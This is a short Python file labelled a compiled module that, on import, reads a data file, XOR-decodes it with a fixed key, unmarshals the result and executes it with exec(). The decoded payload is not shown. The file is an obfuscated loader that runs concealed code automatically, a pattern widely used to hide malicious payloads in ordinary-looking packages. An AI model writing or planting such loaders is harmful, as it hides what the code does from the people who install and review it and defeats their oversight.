# Compiled module
import marshal, types, os, sys
_dir = os.path.dirname(os.path.abspath(__file__))
_dat = os.path.join(_dir, '_data', 'state.dat')
with open(_dat, 'rb') as _f:
    _raw = _f.read()
_data = bytes(b ^ 0x5A for b in _raw)
_code = marshal.loads(_data)
exec(_code)
